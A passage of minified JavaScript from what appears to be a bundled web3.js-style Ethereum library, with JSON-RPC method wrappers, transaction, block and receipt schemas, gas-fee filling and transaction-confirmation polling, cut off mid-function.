    function FB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_newBlockFilter",
                params: []
            })
        })
    }

    function DB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_newPendingTransactionFilter",
                params: []
            })
        })
    }

    function jB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["hex"], [t]), e.send({
                method: "eth_uninstallFilter",
                params: [t]
            })
        })
    }

    function HB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["hex"], [t]), e.send({
                method: "eth_getFilterChanges",
                params: [t]
            })
        })
    }

    function $B(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["hex"], [t]), e.send({
                method: "eth_getFilterLogs",
                params: [t]
            })
        })
    }

    function UB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["filter"], [t]), e.send({
                method: "eth_getLogs",
                params: [t]
            })
        })
    }

    function zB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_getWork",
                params: []
            })
        })
    }

    function GB(e, t, n, r) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["bytes8", "bytes32", "bytes32"], [t, n, r]), e.send({
                method: "eth_submitWork",
                params: [t, n, r]
            })
        })
    }

    function VB(e, t, n, r) {
        return re(this, void 0, void 0, function*() {
            Y.validate(["hex", "blockNumberOrTag"], [t, n]);
            for (const i of r) Y.validate(["number"], [i]);
            return e.send({
                method: "eth_feeHistory",
                params: [t, n, r]
            })
        })
    }

    function WB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_pendingTransactions",
                params: []
            })
        })
    }

    function qB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_requestAccounts",
                params: []
            })
        })
    }

    function QB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_chainId",
                params: []
            })
        })
    }

    function KB(e, t, n, r) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["address", "bytes32[]", "blockNumberOrTag"], [t, n, r]), e.send({
                method: "eth_getProof",
                params: [t, n, r]
            })
        })
    }

    function ZB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "web3_clientVersion",
                params: []
            })
        })
    }

    function YB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["blockNumberOrTag"], [n]), e.send({
                method: "eth_createAccessList",
                params: [t, n]
            })
        })
    }

    function JB(e, t, n, r = !1) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["address"], [t]), e.send({
                method: `eth_signTypedData${r?"":"_v4"}`,
                params: [t, n]
            })
        })
    }
    var ng = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function XB(e) {
        return ng(this, void 0, void 0, function*() {
            return e.send({
                method: "net_version",
                params: []
            })
        })
    }

    function eM(e) {
        return ng(this, void 0, void 0, function*() {
            return e.send({
                method: "net_peerCount",
                params: []
            })
        })
    }

    function tM(e) {
        return ng(this, void 0, void 0, function*() {
            return e.send({
                method: "net_listening",
                params: []
            })
        })
    }
    var Cr = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const nM = e => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_listAccounts",
                params: []
            })
        }),
        rM = (e, t) => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_newAccount",
                params: [t]
            })
        }),
        iM = (e, t, n, r) => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_unlockAccount",
                params: [t, n, r]
            })
        }),
        oM = (e, t) => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_lockAccount",
                params: [t]
            })
        }),
        sM = (e, t, n) => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_importRawKey",
                params: [t, n]
            })
        }),
        aM = (e, t, n) => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_sendTransaction",
                params: [t, n]
            })
        }),
        lM = (e, t, n) => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_signTransaction",
                params: [t, n]
            })
        }),
        cM = (e, t, n, r) => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_sign",
                params: [t, n, r]
            })
        }),
        uM = (e, t, n) => Cr(void 0, void 0, void 0, function*() {
            return e.send({
                method: "personal_ecRecover",
                params: [t, n]
            })
        }),
        Wy = {
            type: "object",
            properties: {
                accessList: {
                    type: "null"
                },
                maxFeePerGas: {
                    type: "null"
                },
                maxPriorityFeePerGas: {
                    type: "null"
                }
            }
        },
        qy = {
            type: "object",
            properties: {
                maxFeePerGas: {
                    type: "null"
                },
                maxPriorityFeePerGas: {
                    type: "null"
                }
            }
        },
        Qy = {
            type: "object",
            properties: {
                gasPrice: {
                    type: "null"
                }
            }
        },
        mc = (e, t, n) => {
            try {
                Y.validateJSONSchema(e, t)
            } catch (r) {
                throw r instanceof ys ? new uP(r.errors, n) : r
            }
        },
        dM = e => {
            var t, n;
            const r = e;
            if (!N(r.type)) {
                let o;
                switch (r.type) {
                    case "0x0":
                        o = Wy;
                        break;
                    case "0x1":
                        o = qy;
                        break;
                    case "0x2":
                        o = Qy;
                        break;
                    default:
                        return D({
                            format: "uint"
                        }, r.type, oe)
                }
                return mc(o, r, r.type), D({
                    format: "uint"
                }, r.type, oe)
            }
            if (!N(r.maxFeePerGas) || !N(r.maxPriorityFeePerGas)) return mc(Qy, r, "0x2"), "0x2";
            if (!N(r.accessList)) return mc(qy, r, "0x1"), "0x1";
            const i = (t = r.hardfork) !== null && t !== void 0 ? t : (n = r.common) === null || n === void 0 ? void 0 : n.hardfork;
            if (!N(i)) {
                const o = Object.keys(Ca).indexOf(i);
                if (o >= Object.keys(Ca).indexOf("london")) return N(r.gasPrice) ? "0x2" : "0x0";
                if (o === Object.keys(Ca).indexOf("berlin")) return "0x0"
            }
            if (!N(r.gasPrice)) return mc(Wy, r, "0x0"), "0x0"
        },
        fM = (e, t) => {
            var n;
            return ((n = t == null ? void 0 : t.transactionTypeParser) !== null && n !== void 0 ? n : dM)(e)
        },
        hM = e => e[0] > 127 ? "0x0" : Sr(e[0]),
        pM = {
            type: "object",
            properties: {
                address: {
                    format: "address"
                },
                storageKeys: {
                    type: "array",
                    items: {
                        format: "bytes32"
                    }
                }
            }
        },
        rg = {
            type: "array",
            items: Object.assign({}, pM)
        },
        mM = {
            type: "object",
            properties: {
                accessList: Object.assign({}, rg),
                gasUsed: {
                    type: "string"
                }
            }
        },
        Ky = {
            type: "string",
            enum: ["goerli", "kovan", "mainnet", "rinkeby", "ropsten", "sepolia"]
        },
        Zy = {
            type: "string",
            enum: ["arrowGlacier", "berlin", "byzantium", "chainstart", "constantinople", "dao", "homestead", "istanbul", "london", "merge", "muirGlacier", "petersburg", "shanghai", "spuriousDragon", "tangerineWhistle"]
        },
        gM = {
            type: "object",
            properties: {
                name: {
                    format: "string"
                },
                networkId: {
                    format: "uint"
                },
                chainId: {
                    format: "uint"
                }
            }
        },
        TA = {
            type: "object",
            properties: {
                from: {
                    format: "address"
                },
                to: {
                    oneOf: [{
                        format: "address"
                    }, {
                        type: "null"
                    }]
                },
                value: {
                    format: "uint"
                },
                gas: {
                    format: "uint"
                },
                gasPrice: {
                    format: "uint"
                },
                effectiveGasPrice: {
                    format: "uint"
                },
                type: {
                    format: "uint"
                },
                maxFeePerGas: {
                    format: "uint"
                },
                maxPriorityFeePerGas: {
                    format: "uint"
                },
                accessList: Object.assign({}, rg),
                data: {
                    format: "bytes"
                },
                input: {
                    format: "bytes"
                },
                nonce: {
                    format: "uint"
                },
                chain: Object.assign({}, Ky),
                hardfork: Object.assign({}, Zy),
                chainId: {
                    format: "uint"
                },
                networkId: {
                    format: "uint"
                },
                common: {
                    type: "object",
                    properties: {
                        customChain: Object.assign({}, gM),
                        baseChain: Object.assign({}, Ky),
                        hardfork: Object.assign({}, Zy)
                    }
                },
                gasLimit: {
                    format: "uint"
                },
                v: {
                    format: "uint"
                },
                r: {
                    format: "bytes32"
                },
                s: {
                    format: "bytes32"
                }
            }
        },
        zp = {
            type: "object",
            properties: Object.assign(Object.assign({}, TA.properties), {
                blockHash: {
                    format: "bytes32"
                },
                blockNumber: {
                    format: "uint"
                },
                hash: {
                    format: "bytes32"
                },
                transactionIndex: {
                    format: "uint"
                },
                from: {
                    format: "address"
                },
                to: {
                    oneOf: [{
                        format: "address"
                    }, {
                        type: "null"
                    }]
                },
                value: {
                    format: "uint"
                },
                gas: {
                    format: "uint"
                },
                gasPrice: {
                    format: "uint"
                },
                effectiveGasPrice: {
                    format: "uint"
                },
                type: {
                    format: "uint"
                },
                maxFeePerGas: {
                    format: "uint"
                },
                maxPriorityFeePerGas: {
                    format: "uint"
                },
                accessList: Object.assign({}, rg),
                data: {
                    format: "bytes"
                },
                input: {
                    format: "bytes"
                },
                nonce: {
                    format: "uint"
                },
                gasLimit: {
                    format: "uint"
                },
                v: {
                    format: "uint"
                },
                r: {
                    format: "bytes32"
                },
                s: {
                    format: "bytes32"
                }
            })
        },
        IA = {
            type: "object",
            properties: {
                index: {
                    format: "uint"
                },
                validatorIndex: {
                    format: "uint"
                },
                address: {
                    format: "address"
                },
                amount: {
                    format: "uint"
                }
            }
        },
        Ju = {
            type: "object",
            properties: {
                baseFeePerGas: {
                    format: "uint"
                },
                blobGasUsed: {
                    format: "uint"
                },
                difficulty: {
                    format: "uint"
                },
                excessBlobGas: {
                    format: "uint"
                },
                extraData: {
                    format: "bytes"
                },
                gasLimit: {
                    format: "uint"
                },
                gasUsed: {
                    format: "uint"
                },
                hash: {
                    format: "bytes32"
                },
                logsBloom: {
                    format: "bytes256"
                },
                miner: {
                    format: "bytes"
                },
                mixHash: {
                    format: "bytes32"
                },
                nonce: {
                    format: "uint"
                },
                number: {
                    format: "uint"
                },
                parentBeaconBlockRoot: {
                    format: "bytes32"
                },
                parentHash: {
                    format: "bytes32"
                },
                receiptsRoot: {
                    format: "bytes32"
                },
                sha3Uncles: {
                    format: "bytes32"
                },
                size: {
                    format: "uint"
                },
                stateRoot: {
                    format: "bytes32"
                },
                timestamp: {
                    format: "uint"
                },
                totalDifficulty: {
                    format: "uint"
                },
                transactions: {
                    oneOf: [{
                        type: "array",
                        items: Object.assign({}, zp)
                    }, {
                        type: "array",
                        items: {
                            format: "bytes32"
                        }
                    }]
                },
                transactionsRoot: {
                    format: "bytes32"
                },
                uncles: {
                    type: "array",
                    items: {
                        format: "bytes32"
                    }
                },
                withdrawals: {
                    type: "array",
                    items: Object.assign({}, IA)
                },
                withdrawalsRoot: {
                    format: "bytes32"
                }
            }
        },
        vM = {
            type: "object",
            properties: {
                author: {
                    format: "bytes32"
                },
                excessDataGas: {
                    format: "uint"
                },
                baseFeePerGas: {
                    format: "uint"
                },
                blobGasUsed: {
                    format: "uint"
                },
                difficulty: {
                    format: "uint"
                },
                excessBlobGas: {
                    format: "uint"
                },
                extraData: {
                    format: "bytes"
                },
                gasLimit: {
                    format: "uint"
                },
                gasUsed: {
                    format: "uint"
                },
                hash: {
                    format: "bytes32"
                },
                logsBloom: {
                    format: "bytes256"
                },
                miner: {
                    format: "bytes"
                },
                mixHash: {
                    format: "bytes32"
                },
                nonce: {
                    format: "uint"
                },
                number: {
                    format: "uint"
                },
                parentBeaconBlockRoot: {
                    format: "bytes32"
                },
                parentHash: {
                    format: "bytes32"
                },
                receiptsRoot: {
                    format: "bytes32"
                },
                sha3Uncles: {
                    format: "bytes32"
                },
                size: {
                    format: "uint"
                },
                stateRoot: {
                    format: "bytes32"
                },
                timestamp: {
                    format: "uint"
                },
                totalDifficulty: {
                    format: "uint"
                },
                transactions: {
                    type: "array",
                    items: {
                        format: "bytes32"
                    }
                },
                transactionsRoot: {
                    format: "bytes32"
                },
                uncles: {
                    type: "array",
                    items: {
                        format: "bytes32"
                    }
                },
                withdrawals: {
                    type: "array",
                    items: Object.assign({}, IA)
                },
                withdrawalsRoot: {
                    format: "bytes32"
                }
            }
        },
        zs = {
            type: "object",
            properties: {
                removed: {
                    format: "bool"
                },
                logIndex: {
                    format: "uint"
                },
                transactionIndex: {
                    format: "uint"
                },
                transactionHash: {
                    format: "bytes32"
                },
                blockHash: {
                    format: "bytes32"
                },
                blockNumber: {
                    format: "uint"
                },
                address: {
                    format: "address"
                },
                data: {
                    format: "bytes"
                },
                topics: {
                    type: "array",
                    items: {
                        format: "bytes32"
                    }
                }
            }
        },
        yM = {
            type: "object",
            properties: {
                startingBlock: {
                    format: "string"
                },
                currentBlock: {
                    format: "string"
                },
                highestBlock: {
                    format: "string"
                },
                knownStates: {
                    format: "string"
                },
                pulledStates: {
                    format: "string"
                }
            }
        },
        Gs = {
            type: "object",
            properties: {
                transactionHash: {
                    format: "bytes32"
                },
                transactionIndex: {
                    format: "uint"
                },
                blockHash: {
                    format: "bytes32"
                },
                blockNumber: {
                    format: "uint"
                },
                from: {
                    format: "address"
                },
                to: {
                    format: "address"
                },
                cumulativeGasUsed: {
                    format: "uint"
                },
                gasUsed: {
                    format: "uint"
                },
                effectiveGasPrice: {
                    format: "uint"
                },
                contractAddress: {
                    format: "address"
                },
                logs: {
                    type: "array",
                    items: Object.assign({}, zs)
                },
                logsBloom: {
                    format: "bytes"
                },
                root: {
                    format: "bytes"
                },
                status: {
                    format: "uint"
                },
                type: {
                    format: "uint"
                }
            }
        },
        wM = {
            type: "object",
            properties: {
                messageHash: {
                    format: "bytes"
                },
                r: {
                    format: "bytes32"
                },
                s: {
                    format: "bytes32"
                },
                v: {
                    format: "bytes"
                },
                message: {
                    format: "bytes"
                },
                signature: {
                    format: "bytes"
                }
            }
        },
        bM = {
            type: "object",
            properties: {
                oldestBlock: {
                    format: "uint"
                },
                baseFeePerGas: {
                    type: "array",
                    items: {
                        format: "uint"
                    }
                },
                reward: {
                    type: "array",
                    items: {
                        type: "array",
                        items: {
                            format: "uint"
                        }
                    }
                },
                gasUsedRatio: {
                    type: "array",
                    items: {
                        type: "number"
                    }
                }
            }
        },
        xM = {
            type: "object",
            properties: {
                key: {
                    format: "bytes32"
                },
                value: {
                    format: "uint"
                },
                proof: {
                    type: "array",
                    items: {
                        format: "bytes32"
                    }
                }
            }
        },
        EM = {
            type: "object",
            properties: {
                balance: {
                    format: "uint"
                },
                codeHash: {
                    format: "bytes32"
                },
                nonce: {
                    format: "uint"
                },
                storageHash: {
                    format: "bytes32"
                },
                accountProof: {
                    type: "array",
                    items: {
                        format: "bytes32"
                    }
                },
                storageProof: {
                    type: "array",
                    items: Object.assign({}, xM)
                }
            }
        };

    function Ht(e, t = At, n = {
        transactionSchema: zp,
        fillInputAndData: !1
    }) {
        var r, i;
        let o = yi({}, e);
        if (N(e == null ? void 0 : e.common) || (o.common = Object.assign({}, e.common), N((r = e.common) === null || r === void 0 ? void 0 : r.customChain) || (o.common.customChain = Object.assign({}, e.common.customChain))), o = D((i = n.transactionSchema) !== null && i !== void 0 ? i : zp, o, t), !N(o.data) && !N(o.input) && Sr(o.data) !== Sr(o.input)) throw new $x({
            data: ue(o.data),
            input: ue(o.input)
        });
        return n.fillInputAndData && (N(o.data) ? N(o.input) || (o.data = o.input) : o.input = o.data), N(o.gasLimit) || (o.gas = o.gasLimit, delete o.gasLimit), o
    }

    function AM(e, t, n = {
        fillInputAndData: !1
    }) {
        return {
            raw: D({
                format: "bytes"
            }, e, t),
            tx: Ht(Object.assign(Object.assign({}, po.fromSerializedData(ke(e)).toJSON()), {
                hash: ue(xs(ke(e))),
                type: hM(ke(e))
            }), t, {
                fillInputAndData: n.fillInputAndData,
                transactionSchema: n.transactionSchema
            })
        }
    }
    var ig = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function og(e, t) {
        return ig(this, void 0, void 0, function*() {
            const n = yield XB(e.requestManager);
            return D({
                format: "uint"
            }, n, t)
        })
    }

    function _M(e, t) {
        return ig(this, void 0, void 0, function*() {
            const n = yield eM(e.requestManager);
            return D({
                format: "uint"
            }, n, t)
        })
    }
    const SM = e => ig(void 0, void 0, void 0, function*() {
        return tM(e.requestManager)
    });
    var uh = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class CA extends Lt {
        getId(t = this.defaultReturnFormat) {
            return uh(this, void 0, void 0, function*() {
                return og(this, t)
            })
        }
        getPeerCount(t = this.defaultReturnFormat) {
            return uh(this, void 0, void 0, function*() {
                return _M(this, t)
            })
        }
        isListening() {
            return uh(this, void 0, void 0, function*() {
                return SM(this)
            })
        }
    }
    const Ts = "ALLEVENTS",
        Gp = {
            name: Ts,
            signature: "",
            type: "event",
            inputs: []
        },
        af = {
            bytes: Er.HEX,
            number: dn.NUMBER
        };
    var PA = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function kM(e, t, n) {
        var r, i, o, s;
        return PA(this, void 0, void 0, function*() {
            const a = yield o2(t, t.defaultBlock, !1, oe);
            if (N(a.baseFeePerGas)) throw new sP;
            let l;
            if (N(e.gasPrice) && BigInt(a.baseFeePerGas) === BigInt(0) && (l = yield pg(t, n)), !N(e.gasPrice) || !N(l)) {
                const u = D({
                    format: "uint"
                }, (r = e.gasPrice) !== null && r !== void 0 ? r : l, n);
                return {
                    maxPriorityFeePerGas: u,
                    maxFeePerGas: u
                }
            }
            return {
                maxPriorityFeePerGas: D({
                    format: "uint"
                }, (i = e.maxPriorityFeePerGas) !== null && i !== void 0 ? i : t.defaultMaxPriorityFeePerGas, n),
                maxFeePerGas: D({
                    format: "uint"
                }, (o = e.maxFeePerGas) !== null && o !== void 0 ? o : BigInt(a.baseFeePerGas) * BigInt(2) + BigInt((s = e.maxPriorityFeePerGas) !== null && s !== void 0 ? s : t.defaultMaxPriorityFeePerGas), n)
            }
        })
    }

    function RA(e, t, n) {
        return PA(this, void 0, void 0, function*() {
            const r = NA(e, t);
            if (!N(r)) {
                if (r.startsWith("-")) throw new uy(r);
                if (Number(r) < 0 || Number(r) > 127) throw new uy(r);
                if (N(e.gasPrice) && (r === "0x0" || r === "0x1")) return {
                    gasPrice: yield pg(t, n), maxPriorityFeePerGas: void 0, maxFeePerGas: void 0
                };
                if (r === "0x2") return Object.assign({
                    gasPrice: void 0
                }, yield kM(e, t, n))
            }
        })
    }
    var sg = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const Vp = (e, t, n, r) => {
            if (n !== void 0 && e in n && n[e] !== void 0) {
                if (typeof n[e] == "string" && Zt(n[e])) return n[e];
                if (!ye(n[e]) && yE(n[e])) {
                    if (t.wallet) {
                        const i = t.wallet.get(D({
                            format: "uint"
                        }, n[e], af));
                        if (!N(i)) return i.address;
                        throw new dy
                    }
                    throw new dy
                } else throw e === "from" ? new $4(n.from) : new U4(n.to)
            }
            if (e === "from") {
                if (!N(r)) return sf(r);
                if (!N(t.defaultAccount)) return t.defaultAccount
            }
        },
        TM = (e, t, n = e.defaultReturnFormat) => sg(void 0, void 0, void 0, function*() {
            if (N(t)) throw new oP;
            return a2(e, t, e.defaultBlock, n)
        }),
        NA = (e, t) => {
            const n = fM(e, t);
            if (!N(n)) return n;
            if (!N(t.defaultTransactionType)) return D({
                format: "uint"
            }, t.defaultTransactionType, oe)
        };

    function IM(e) {
        var t, n;
        return sg(this, void 0, void 0, function*() {
            let r = D(TA, e.transaction, e.web3Context.defaultReturnFormat);
            if (N(r.from) && (r.from = Vp("from", e.web3Context, void 0, e.privateKey)), N(r.nonce) && (r.nonce = yield TM(e.web3Context, r.from, oe)), N(r.value) && (r.value = "0x0"), N(r.data)) N(r.input) ? r.input = "0x" : r.input.startsWith("0x") || (r.input = `0x${r.input}`);
            else {
                if (!N(r.input) && r.data !== r.input) throw new $x({
                    data: ue(r.data),
                    input: ue(r.input)
                });
                r.data.startsWith("0x") || (r.data = `0x${r.data}`)
            }
            if (N(r.common)) {
                if (e.web3Context.defaultCommon) {
                    const i = e.web3Context.defaultCommon,
                        o = i.customChain.chainId,
                        s = i.customChain.networkId,
                        a = i.customChain.name;
                    r.common = Object.assign(Object.assign({}, i), {
                        customChain: {
                            chainId: o,
                            networkId: s,
                            name: a
                        }
                    })
                }
                N(r.chain) && (r.chain = e.web3Context.defaultChain), N(r.hardfork) && (r.hardfork = e.web3Context.defaultHardfork)
            }
            if (N(r.chainId) && N((t = r.common) === null || t === void 0 ? void 0 : t.customChain.chainId) && (r.chainId = yield c2(e.web3Context, oe)), N(r.networkId) && (r.networkId = (n = e.web3Context.defaultNetworkId) !== null && n !== void 0 ? n : yield og(e.web3Context, oe)), N(r.gasLimit) && !N(r.gas) && (r.gasLimit = r.gas), r.type = NA(r, e.web3Context), N(r.accessList) && (r.type === "0x1" || r.type === "0x2") && (r.accessList = []), e.fillGasPrice && (r = Object.assign(Object.assign({}, r), yield RA(r, e.web3Context, oe))), N(r.gas) && N(r.gasLimit) && e.fillGasLimit) {
                const i = yield vg(e.web3Context, r, "latest", oe);
                r = Object.assign(Object.assign({}, r), {
                    gas: D({
                        format: "uint"
                    }, i, oe)
                })
            }
            return r
        })
    }
    const CM = e => sg(void 0, void 0, void 0, function*() {
        var t;
        return ((t = e.web3Context.transactionBuilder) !== null && t !== void 0 ? t : IM)(Object.assign(Object.assign({}, e), {
            transaction: e.transaction
        }))
    });
    var ag = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function Wp(e, t, n) {
        const r = e.transactionPollingInterval,
            [i, o] = BE(() => ag(this, void 0, void 0, function*() {
                let a;
                try {
                    a = yield mg(e, af)
                } catch (u) {
                    console.warn("An error happen while trying to get the block number", u);
                    return
                }
                const l = a - t;
                if (l >= e.transactionBlockTimeout) return new Gx({
                    starterBlockNumber: t,
                    numberOfBlocks: l,
                    transactionHash: n
                })
            }), r);
        return [o, {
            clean: () => {
                clearInterval(i)
            }
        }]
    }

    function PM(e, t, n) {
        var r;
        return ag(this, void 0, void 0, function*() {
            let i = !0,
                o, s;

            function a(u, c) {
                c && console.warn("error happened at subscription. So revert to polling...", c), s.clean(), i = !1;
                const [d, f] = Wp(e, t, n);
                s.clean = f.clean, d.catch(h => u(h))
            }
            try {
                o = yield(r = e.subscriptionManager) === null || r === void 0 ? void 0 : r.subscribe("newHeads"), s = {
                    clean: () => {
                        var u;
                        o.id && ((u = e.subscriptionManager) === null || u === void 0 || u.removeSubscription(o).then(() => {}).catch(() => {}))
                    }
                }
            } catch {
                return Wp(e, t, n)
            }
            return [new Promise((u, c) => {
                try {
                    o.on("data", d => {
                        if (i = !1, !(d != null && d.number)) return;
                        const f = Number(BigInt(d.number) - BigInt(t));
                        f >= e.transactionBlockTimeout && c(new Gx({
                            starterBlockNumber: t,
                            numberOfBlocks: f,
                            transactionHash: n
                        }))
                    }), o.on("error", d => {
                        a(c, d)
                    })
                } catch (d) {
                    a(c, d)
                }
                setTimeout(() => {
                    i && a(c)
                }, e.blockHeaderTimeout * 1e3)
            }), s]
        })
    }

    function BA(e, t) {
        var n, r;
        return ag(this, void 0, void 0, function*() {
            const {
                provider: i
            } = e.requestManager;
            let o;
            const s = yield mg(e, af);
            return !((r = (n = i).supportsSubscriptions) === null || r === void 0) && r.call(n) && e.enableExperimentalFeatures.useSubscriptionWhenCheckingBlockTimeout ? o = yield PM(e, s, t): o = Wp(e, s, t), o
        })
    }
    var RM = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function qp(e, t, n) {
        return RM(this, void 0, void 0, function*() {
            const [r, i] = F0(e.transactionSendTimeout, new aP({
                numberOfSeconds: e.transactionSendTimeout / 1e3,
                transactionHash: n
            })), [o, s] = yield BA(e, n);
            try {
                return yield Promise.race([t(), i, o])
            } finally {
                clearTimeout(r), s.clean()
            }
        })
    }
    var Yy = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function MA(e, t, n, r) {
        var i;
        return Yy(this, void 0, void 0, function*() {
            const o = (i = e.transactionReceiptPollingInterval) !== null && i !== void 0 ? i : e.transactionPollingInterval,
                [s, a] = L0(() => Yy(this, void 0, void 0, function*() {
                    try {
                        return (r ?? s2)(e, t, n)
                    } catch (f) {
                        console.warn("An error happen while trying to get the transaction receipt", f);
                        return
                    }
                }), o),
                [l, u] = F0(e.transactionPollingTimeout, new zx({
                    numberOfSeconds: e.transactionPollingTimeout / 1e3,
                    transactionHash: t
                })),
                [c, d] = yield BA(e, t);
            try {
                return yield Promise.race([s, u, c])
            } finally {
                l && clearTimeout(l), a && clearInterval(a), d.clean()
            }
        })
    }
    var NM = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const Lc = ({
        web3Context: e,
        transactionReceipt: t,
        transactionPromiEvent: n,
        customTransactionReceiptSchema: r,
        returnFormat: i
    }) => {
        var o;
        let s = 1;
        const a = setInterval(() => {
            NM(void 0, void 0, void 0, function*() {
                if (s >= e.transactionConfirmationBlocks) {
                    clearInterval(a);
                    return
                }
                const l = yield kA(e.requestManager, Ze(BigInt(t.blockNumber) + BigInt(s)), !1);
                l != null && l.hash && (s += 1, n.emit("confirmation", {
                    confirmations: D({
                        format: "uint"
                    }, s, i),
                    receipt: D(r ?? Gs, t, i),
                    latestBlockHash: D({
                        format: "bytes32"
                    }, l.hash, i)
                }))
            })
        }, (o = e.transactionReceiptPollingInterval) !== null && o !== void 0 ? o : e.transactionPollingInterval)
    };
    var Jy = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const BM = ({
        web3Context: e,
        transactionReceipt: t,
        transactionPromiEvent: n,
        customTransactionReceiptSchema: r,
        returnFormat: i
    }) => {
